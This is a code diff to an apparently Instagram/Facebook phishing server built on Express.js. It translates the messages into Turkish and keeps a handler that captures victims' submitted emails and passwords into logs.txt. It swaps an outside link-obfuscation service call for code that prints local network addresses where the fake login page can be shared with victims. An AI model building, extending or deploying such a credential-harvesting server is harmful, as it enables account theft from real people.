@@ -24,7 +24,7 @@ app.get('/', function (req, res) {
 
 app.post('/_', function (req, res) {
     res.render('i_success');
-    var captured_content = `\n[-] Email: ${req.body.email} Password: ${req.body.password}`
+    var captured_content = `\n[-] E-posta: ${req.body.email} Şifre: ${req.body.password}`
     fs.appendFile('logs.txt', captured_content, err => {
         if (err) {
             console.error(err)
@@ -60,9 +60,50 @@ app.get('/fonts/segoe-ui-regular.ttf', function (req, res) {
 });
 
 app.listen(port, () => {
-    console.log('[!] Server Running!')
+    console.log('[!] Sunucu Çalışıyor!')
 });
 
-axios.get(`http://anoni4.cf/api?create&key=D03hVPibJRaxvXqmus8NAE7WC6n2KyfGcwI&link=http://${networkInterfaces.Ethernet[0].address}:${port}`).then(async res => {
-    console.log(`[!] You can share this hidden link with your network users: ${res.data.Link}\n[!] If the link doesn't work. Try using your IPV4 + PORT: ${networkInterfaces.Ethernet[1].address}:${port}\n\n[+] Give this project a star on GitHub: https://github.com/pauloodev/phishing-facebook`)
-});
+// URL kısaltma servisi çalışmıyor, doğrudan IP adresini kullanıyoruz
+try {
+    // Kullanılabilir bir ağ arayüzü bul
+    let ipAddress = '';
+    let foundInterfaces = [];
+    
+    Object.keys(networkInterfaces).forEach((interfaceName) => {
+        const interfaces = networkInterfaces[interfaceName];
+        if (interfaces) {
+            interfaces.forEach((iface) => {
+                // IPv4 adresi ve dahili olmayan arayüzleri seç
+                if (iface.family === 'IPv4' && !iface.internal) {
+                    foundInterfaces.push({
+                        name: interfaceName,
+                        address: iface.address
+                    });
+                    if (!ipAddress) {
+                        ipAddress = iface.address;
+                    }
+                }
+            });
+        }
+    });
+    
+    if (ipAddress) {
+        console.log(`[!] Sunucu şu adreste çalışıyor: http://${ipAddress}:${port}`);
+        
+        if (foundInterfaces.length > 1) {
+            console.log(`[!] Diğer kullanılabilir adresler:`);
+            foundInterfaces.forEach(iface => {
+                if (iface.address !== ipAddress) {
+                    console.log(`    - http://${iface.address}:${port} (${iface.name})`);
+                }
+            });
+        }
+    } else {
+        console.log(`[!] Sunucu çalışıyor, port: ${port}`);
+        console.log(`[!] Ağ arayüzü bulunamadı, 'ipconfig' komutu ile IP adresinizi kontrol edebilirsiniz.`);
+    }
+    console.log(`\n[+] GitHub: https://github.com/pauloodev/phishing-instagram`);
+} catch (error) {
+    console.log(`[!] Sunucu çalışıyor, port: ${port}`);
+    console.log(`[!] Hata: ${error.message}`);
+}
